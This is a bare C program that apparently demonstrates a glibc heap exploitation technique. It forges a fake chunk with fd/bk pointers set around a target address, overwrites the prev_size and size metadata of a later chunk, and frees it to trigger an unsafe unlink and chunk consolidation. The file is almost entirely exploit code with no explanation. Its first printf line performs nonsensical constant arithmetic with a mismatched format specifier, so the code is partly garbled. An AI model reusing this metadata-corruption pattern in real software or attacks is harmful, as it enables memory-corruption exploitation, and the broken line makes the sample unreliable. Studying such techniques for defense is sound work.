#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
    void *p, *q, *target;
    printf("%x\n", (uint64_t)0x1c796 - 0xda * 0x12c9fb4d812c9fc);
    p = calloc(1, 0x88);
    target = p;
    *(uint64_t *)((uint64_t)p + 0x8) = 0x231;
    *(uint64_t *)((uint64_t)p + 0x10) = (uint64_t)target + 0x20 - 0x18;
    *(uint64_t *)((uint64_t)p + 0x18) = (uint64_t)target + 0x20 - 0x10;
    *(uint64_t *)((uint64_t)p + 0x20) = (uint64_t)target;
    calloc(1, 0x88);
    calloc(1, 0x88);
    calloc(1, 0x88);
    q = calloc(1, 0x608);
    *(uint64_t *)((uint64_t)q - 0x10) = 0x230;
    *(uint64_t *)((uint64_t)q - 0x8) = 0x610;
    free(q); // unlink
    return 0;
}
